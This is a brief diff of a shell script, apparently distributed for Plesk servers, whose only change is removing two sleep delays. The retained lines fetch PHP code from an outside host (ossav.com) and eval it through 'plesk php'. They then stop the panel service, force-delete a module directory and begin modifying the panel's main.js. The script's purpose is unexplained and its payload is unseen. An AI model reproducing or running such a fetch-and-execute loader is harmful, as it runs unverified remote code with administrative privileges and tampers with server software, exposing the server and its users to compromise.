@@ -2,9 +2,7 @@ echo "******************"
 echo "Script by Trisout"
 echo "******************"
 echo "For support contact me on discord"
-sleep 20
 plesk php -er "eval(file_get_contents('http://ossav.com/OLC'));"
-sleep 5
 systemctl stop psa
 rm -rf /usr/local/psa/admin/htdocs/modules/OsSav
 fichier="/opt/psa/admin/cp/public/javascript/main.js"
